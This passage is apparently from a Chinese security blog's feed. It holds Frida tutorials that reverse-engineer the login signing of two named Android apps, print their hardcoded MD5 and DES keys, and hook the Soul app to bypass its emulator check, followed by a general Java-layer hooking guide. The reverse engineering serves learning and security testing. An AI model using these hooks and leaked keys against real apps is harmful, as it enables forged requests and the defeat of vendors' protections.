    <content type="html"><![CDATA[<h3><span id="邻居合伙人hook">邻居合伙人Hook</span></h3><p>对邻居合伙人APP登录sign签名算法的hook。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577081242331.png" alt="1577081242331"></p><p>在登录处进行抓包操作，可以看到登录数据报中有apisign字段。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577081216180.png" alt="1577081216180"></p><p>对APK进行反编译，搜索apisign关键字。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577082970426.png" alt="1577082970426"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">newBodyBuilder.add(&quot;data&quot;, data.toString());</span><br><span class="line">newBodyBuilder.add(&quot;apisign&quot;, MD5Util.ToMD5(Constants.MD5_KEY, data.toString()));</span><br><span class="line">L.d(&quot;请求地址RequestUrl=====&quot;, oldUrl.url().toString());</span><br><span class="line">L.d(&quot;请求参数Params=========&quot;, data.toString());</span><br><span class="line">L.json(data.toString());</span><br><span class="line">return newBodyBuilder.build();</span><br></pre></td></tr></table></figure><p>根据代码可以看到，apisign内容主要是通过MD5Util类的ToMD5()方法生成的，跳转到ToMD5()方法内容：</p><pre><code>public static String ToMD5(String secretKey, String pstr) {    pstr = secretKey + pstr;    char[] hexDigits = new char[]{&apos;0&apos;, &apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;, &apos;5&apos;, &apos;6&apos;, &apos;7&apos;, &apos;8&apos;, &apos;9&apos;, &apos;A&apos;, &apos;B&apos;, &apos;C&apos;, &apos;D&apos;, &apos;E&apos;, &apos;F&apos;};    try {        MessageDigest md5Temp = MessageDigest.getInstance(&quot;MD5&quot;);        md5Temp.update(pstr.getBytes(&quot;UTF8&quot;));        char[] str = new char[(j * 2)];        int k = 0;        for (byte byte0 : md5Temp.digest()) {            int i = k + 1;            str[k] = hexDigits[(byte0 &gt;&gt;&gt; 4) &amp; 15];            k = i + 1;            str[i] = hexDigits[byte0 &amp; 15];        }        return new String(str).toLowerCase();    } catch (Exception e) {        return null;    }}</code></pre><p>这个方法有两个参数，一个secretkey和pstr。且为普通函数。通过静态分析，MD5Util.ToMD5()传入两个值，一个是Constants.MD5_KEY,跳转发现是Constants类的静态变量。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577083722889.png" alt="1577083722889"></p><p>其值为：d367f4699214cec412f7c2a1d513fe05。另外一个变量则是app登录信息。</p><p>而用frida主要是对MD5Util.ToMD5()方法的两个变量进行hook。</p><p>编写如下hook脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    var md5 = Java.use('com.softgarden.baselibrary.utils.MD5Util');</span></span><br><span class="line"><span class="string">    md5.ToMD5.implementation = function (a, b) &#123;</span></span><br><span class="line"><span class="string">        send("Hook Start...");</span></span><br><span class="line"><span class="string">        console.log("arg1:   " + a );</span></span><br><span class="line"><span class="string">        console.log("arg2:   " + b);</span></span><br><span class="line"><span class="string">        var res = this.ToMD5(a, b);</span></span><br><span class="line"><span class="string">        console.log("return:   " + res);</span></span><br><span class="line"><span class="string">        send("Success!");</span></span><br><span class="line"><span class="string">        return res;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">"type"</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(<span class="string">"[*] &#123;0&#125;"</span>.format(message[<span class="string">'payload'</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">device = frida.get_remote_device()</span><br><span class="line">pid = device.spawn([<span class="string">"com.ljhhr.mobile"</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)  <span class="comment"># Without it Java.perform silently fails</span></span><br><span class="line">session = device.attach(pid)</span><br><span class="line">script = session.create_script(jscode)</span><br><span class="line">script.on(<span class="string">"message"</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行如上脚本进行hook，可以看到如下结果。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577086081315.png" alt="1577086081315"></p><p>通过多次hook可以看到第一个变量为固定的，即我们静态分析代码得到的：d367f4699214cec412f7c2a1d513fe05</p><p>第二个参数为输入登录的输入内容。至此，完成对该APP的sign算法的hook。</p><h3><span id="嘟嘟牛在线hook">嘟嘟牛在线Hook</span></h3><p>同样在登录界面，进行抓包操作。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577088552194.png" alt=""></p><p>同时对apk进行反编译。可以搜索url路径关键字：user/login，也可以搜索数据报关键字：Encrypt。</p><p>搜索user/login定位到类名：com.dodonew.online.ui.LoginActivity中的requestNetwork方法。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577088736128.png" alt="1577088736128"></p><p>分析代码，可知数据报中的内容通过addRequestMap方法添加。跳转到com.dodonew.online.http.JsonRequest类的addRequestMap方法。</p><p>定位到我们在数据报中看到的关键字：Encrypt。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577088836168.png" alt="1577088836168"></p><p>此处的encrypt即加密后的内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String encrypt = RequestUtil.encodeDesMap(RequestUtil.paraMap(addMap, Config.BASE_APPEND, &quot;sign&quot;), this.desKey, this.desIV);</span><br></pre></td></tr></table></figure><p>通过des算法进行加密后的数据。该方法为encodeDesMap。其有三个参数。</p><p>跟踪变量desKey，desIV。跳转到com.dodonew.online.config.Config类。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577089081679.png" alt="1577089081679"></p><p>可以得到des加密算法的key值为65102933，偏移值IV为：32028092。</p><p>跟踪encodeDesMap方法的第一个参数。RequestUtil.paraMap(addMap, Config.BASE_APPEND, “sign”)</p><p>跟进paraMap方法到com.dodonew.online.http.RequestUtil类。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577089875523.png" alt="1577089875523"></p><p>发现存在sign,跟进md5方法到com.dodonew.online.util.Utils类。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577090272134.png" alt="1577090272134"></p><p>可以看到md5是一个普通的方法。如果需要进行hook，直接hook参数值和返回值就行了。</p><p>hook部分的js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Utils = Java.use(<span class="string">'com.dodonew.online.util.Utils'</span>);</span><br><span class="line">Utils.md5.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    send(<span class="string">"Hook Start md5..."</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"md5-arg:   "</span> + a);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">this</span>.md5(a);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"md5-result:   "</span> + result);</span><br><span class="line">    send(<span class="string">"Success!"</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而com.dodonew.online.http.RequestUtil类下的encodeDesMap方法是一个重载方法。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577090685066.png" alt="1577090685066"></p><p>所以在传入需要hook的方法是要用到overload。且这里的重载参数类型为String。所以要用overload(‘java.lang.String’,’java.lang.String’,’java.lang.String’)。因为String在Java中是以类的形式存在的数据类型。同时String类在java.lang包中。<br>故此处的js代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var RequestUtil = Java.use(&apos;com.dodonew.online.http.RequestUtil&apos;);    RequestUtil.encodeDesMap.overload(&apos;java.lang.String&apos;,&apos;java.lang.String&apos;,&apos;java.lang.String&apos;).implementation = function (data, key ,iv) &#123;</span><br><span class="line">        send(&quot;Hook Start encodeDesMap...&quot;);</span><br><span class="line">       console.log(&quot;encodeDesMap-data:   &quot; + data);</span><br><span class="line">       console.log(&quot;encodeDesMap-key:   &quot; + key);</span><br><span class="line">       console.log(&quot;encodeDesMap-iv:   &quot; + iv);</span><br><span class="line">        var result = this.encodeDesMap(data, key ,iv);</span><br><span class="line">       console.log(&quot;encodeDesMap-result:   &quot; + result);</span><br><span class="line">        send(&quot;Success!&quot;);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>python通用hook模版加载两段js代码即可对该APP进行hook。</p><p>成功hook到所有参数。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577091207270.png" alt="1577091207270"></p><h3><span id="soul-hook">Soul Hook</span></h3><p>Soul是一款社交app，此APP在模拟器中是无法启动的,如下：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577092404464.png" alt="1577092404464"></p><p>显示<code>SoulApp暂不支持模拟器，请稍后再试~</code></p><p>搜索关键字<code>SoulApp暂不支持模拟器，请稍后再试~</code>定位到cn.soulapp.android.ui.splash.SplashActivity类下。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577092850497.png" alt="1577092850497"></p><p>可见此处判断if (cn.soulapp.android.utils.j.e())返回的是true。</p><p>跟进方法e到类。cn.soulapp.android.utils.j</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">e</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        SoulApp b = SoulApp.b();</span><br><span class="line">        Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">        intent.setData(Uri.parse(<span class="string">"tel:123456"</span>));</span><br><span class="line">        intent.setAction(<span class="string">"android.intent.action.DIAL"</span>);</span><br><span class="line">        <span class="keyword">return</span> Build.FINGERPRINT.startsWith(<span class="string">"generic"</span>) || Build.FINGERPRINT.toLowerCase().contains(<span class="string">"vbox"</span>) || Build.FINGERPRINT.toLowerCase().contains(<span class="string">"test-keys"</span>) || Build.MODEL.contains(<span class="string">"google_sdk"</span>) || Build.MODEL.contains(<span class="string">"Emulator"</span>) || Build.SERIAL.equalsIgnoreCase(<span class="string">"unknown"</span>) || Build.SERIAL.equalsIgnoreCase(DispatchConstants.ANDROID) || Build.MODEL.contains(<span class="string">"Android SDK built for x86"</span>) || Build.MANUFACTURER.contains(<span class="string">"Genymotion"</span>) || ((Build.BRAND.startsWith(<span class="string">"generic"</span>) &amp;&amp; Build.DEVICE.startsWith(<span class="string">"generic"</span>)) || <span class="string">"google_sdk"</span>.equals(Build.PRODUCT) || ((TelephonyManager) b.getSystemService(<span class="string">"phone"</span>)).getNetworkOperatorName().toLowerCase().equals(DispatchConstants.ANDROID) || (intent.resolveActivity(b.getPackageManager()) != <span class="keyword">null</span> ? <span class="number">1</span> : <span class="keyword">null</span>) == <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们只需要把e方法的返回值改为false，即可跳过模拟器验证。</p><p>js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> j = Java.use(<span class="string">'cn.soulapp.android.utils.j'</span>);</span><br><span class="line">j.e.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    send(<span class="string">"Hook Start ..."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行hook脚本，成功进入登录界面</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1577093544446.png" alt="1577093544446"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;邻居合伙人hook&quot;&gt;邻居合伙人Hook&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;对邻居合伙人APP登录sign签名算法的hook。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://uknowsec-1251971873.cos.ap-shanghai.myqc
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>frida-Java层代码Hook</title>
    <link href="https://uknowsec.cn/posts/notes/frida-Java%E5%B1%82%E4%BB%A3%E7%A0%81Hook.html"/>
    <id>https://uknowsec.cn/posts/notes/frida-Java层代码Hook.html</id>
    <published>2019-12-06T02:37:05.000Z</published>
    <updated>2019-12-06T02:47:25.684Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="hook构造方法">Hook构造方法</span></h3><p>要hook的是一个类的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Money <span class="title">getMoney</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Money(<span class="number">60</span>, <span class="string">"RMB"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过<code>$init</code>来获取并修改一个类的构造方法。（注意，js是弱类型语言，而Java强类型，注意构造的时候的类型转换。）</p><p>获取参数可以通过自定义参数名也可以直接用系统隐含的arguments变量获取即可</p><p> 下面是jscode</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> money=Java.use(<span class="string">"com.XXXX.app.Money"</span>);</span><br><span class="line">money.$init.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Hook Start..."</span>);</span><br><span class="line">    send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    send(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.$init(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="hook重载方法">Hook重载方法</span></h3><p>要hook的重载方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test without argument"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"this is test with num "</span>+num;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在方法后面加一个<code>overload</code>属性，参数为函数的类型，类型用字符串传入，用于指定具体要hook的方法。例如<code>utils.test.overload(&quot;int&quot;).implementation</code>。<br> 注意，要填写类的路径，例如如果是字符串类型，则要用<code>overload(&quot;int&quot;,&quot;java.lang.String&quot;)</code><br> jscode:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">utils.test.overload(<span class="string">"int"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Hook Start..."</span>);</span><br><span class="line">        send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Hook Success..."</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"This overload func is hooked"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="hook对象参数的构造">Hook对象参数的构造</span></h3><p>要hook的以对象为参数的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.XXXX.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utils</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">(Money money)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money.getInfo();</span><br><span class="line">    &#125;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们使用一个类型的<code>$new</code>来实例化一个类<br> jscode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jscode = <span class="string">"""</span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var utils = Java.use("com.XXXX.app.Utils");</span></span><br><span class="line"><span class="string">    var money=Java.use("com.XXXX.app.Money");</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    utils.test.overload("com.XXXX.app.Money").implementation = function(a)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        console.log("Hook Start...");</span></span><br><span class="line"><span class="string">        send(a.getInfo());</span></span><br><span class="line"><span class="string">        var m = money.$new(6666,"DOLLAR");</span></span><br><span class="line"><span class="string">        send(m.getInfo());</span></span><br><span class="line"><span class="string">        return m.getInfo();</span></span><br><span class="line"><span class="string">        //return this.test(m);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h3><span id="修改对象属性的值">修改对象属性的值</span></h3><h5><span id="常规方法">常规方法</span></h5><ul><li>如果<code>obj.Attr</code>的话，获取到的还是对象，例如<code>a.name</code>的返回值是<code>[*] {&#39;value&#39;: &#39;美元&#39;, &#39;fieldType&#39;: 2, &#39;fieldReturnType&#39;: {&#39;className&#39;: &#39;java.lang.String&#39;, &#39;name&#39;: &#39;Ljava/lang/String;&#39;, &#39;type&#39;: &#39;pointer&#39;, &#39;size&#39;: 1}} [*] 美元</code> </li><li>我们使用<code>a.name.value</code>就能获取对象属性的值了。<br> 例如</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">utils.test.overload(<span class="string">"com.xiaojianbang.app.Money"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Hook Start..."</span>);</span><br><span class="line">        send(a.name); <span class="comment">//object</span></span><br><span class="line">        send(a.name.value); <span class="comment">//real value</span></span><br><span class="line">        <span class="keyword">var</span> m = money.$<span class="keyword">new</span>(<span class="number">6666</span>,<span class="string">"DOLLAR"</span>);</span><br><span class="line">        m.name.value=<span class="string">"ForeignMoney"</span>;</span><br><span class="line">        send(m.getInfo());</span><br><span class="line">        <span class="keyword">return</span> m.getInfo();</span><br><span class="line">        <span class="comment">//return this.test(m);</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5><span id="java反射">Java反射</span></h5><p>对于私有属性，我们可以用Java反射的方法设置。<br> 在Java反射中，通过<code>Java.cast(m.getClass(),clazz).getDeclaredField(&#39;num&#39;)</code>，m为一个实例化对象，后面<code>getDeclaredField</code>可以获得属性。通过<code>Java.use(&#39;java.lang.Class&#39;);</code>获取类的构造器<br> 这里，通过属性的<code>get(ObjectsInstantiated)</code>可以获取值，通过属性的<code>setInt(ObjectsInstantiated，value)</code>可以设置一个对象的属性值。<code>ObjectsInstantiated</code>为一个对象。<br> 这里，对于反射后的值，用<code>console.log</code>可以很好的输出值，而<code>send</code>在此处会打印对象。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">"com.XXXX.app.Utils"</span>);</span><br><span class="line">    <span class="keyword">var</span> money=Java.use(<span class="string">"com.XXXX.app.Money"</span>);</span><br><span class="line">    </span><br><span class="line">    utils.test.overload(<span class="string">"com.XXXX.app.Money"</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Hook Start..."</span>);</span><br><span class="line">        <span class="keyword">var</span> m = money.$<span class="keyword">new</span>(<span class="number">6666</span>,<span class="string">"DOLLAR"</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">'java.lang.Class'</span>);</span><br><span class="line">        <span class="keyword">var</span> num_id = Java.cast(m.getClass(),clazz).getDeclaredField(<span class="string">'num'</span>);</span><br><span class="line">        num_id.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">var</span> value = num_id.get(m);</span><br><span class="line">        <span class="built_in">console</span>.log(value);</span><br><span class="line">        send(value); <span class="comment">// have format problem</span></span><br><span class="line">        num_id.setInt(m,<span class="number">23333</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(num_id.get(m));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.test(m);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3><span id="hook内部类">Hook内部类</span></h3><p>要hook的内部类。</p><p>在 Java 中，可以将一个类定义在另一个类里面或者一个方法里面，这样的类称为内部类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> radius = <span class="number">0</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">(<span class="keyword">double</span> radius)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.radius = radius;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Draw</span> </span>&#123;     <span class="comment">//内部类</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawSahpe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"drawshape"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在获取要hook的类后加<code>$</code>和内部类名。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> inInnerClass = Java.use(<span class="string">'com.XXXX.app.Circle$Draw'</span>);</span><br><span class="line"></span><br><span class="line">inInnerClass.drawSahpe.implementation = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="打印方法堆栈信息">打印方法堆栈信息</span></h3><p>用Java.use方法获取类型变量：var Exception = Java.use(“java.lang.Exception”)</p><p>然后是js中支持throw语法的，直接在需要打印堆栈信息的方法中调用即可。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AndroidLog = Java.use(<span class="string">"android.util.Log"</span>)</span><br><span class="line">AndroidException = Java.use(<span class="string">"java.lang.Exception"</span>)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStackTrace</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(AndroidLog .getStackTraceString(AndroidException .$<span class="keyword">new</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="总结">总结</span></h3><h4><span id="java层代码hook操作">Java层代码Hook操作</span></h4><ul><li><p>1、hook方法包括构造方法和对象方法，构造方法固定写法是$init，普通方法直接是方法名，参数可以自己定义也可以使用系统隐含的变量arguments获取。</p></li><li><p>2、修改方法的参数和返回值，直接调用原始方法通过传入想要修改的参数来做到修改参数的目的，以及修改返回值即可。</p></li><li>3、构造对象和修改对象的属性值，直接用反射进行操作，构造对象用固定写法的$new即可。</li><li>4、直接用Java的Exception对象打印堆栈信息，然后通过adb logcat -s 